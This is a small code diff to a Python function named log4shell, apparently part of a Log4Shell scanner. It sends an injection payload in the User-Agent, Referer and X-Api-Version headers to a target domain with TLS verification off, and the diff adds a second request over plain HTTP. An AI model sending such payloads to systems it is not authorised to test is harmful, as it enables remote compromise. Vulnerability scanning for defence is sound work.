@@ -30,6 +30,7 @@ def log4shell(domain):
         headers = {'User-Agent':payload, 'Referer':payload, 'X-Api-Version': payload}
         print(f'Testing https://{domain}')
         get(f"https://{domain}", headers=headers, params=params, verify=False, timeout=1)
+        get(f"http://{domain}", headers=headers, params=params, verify=False, timeout=1)
     except Exception as e:
         print(e)
         pass
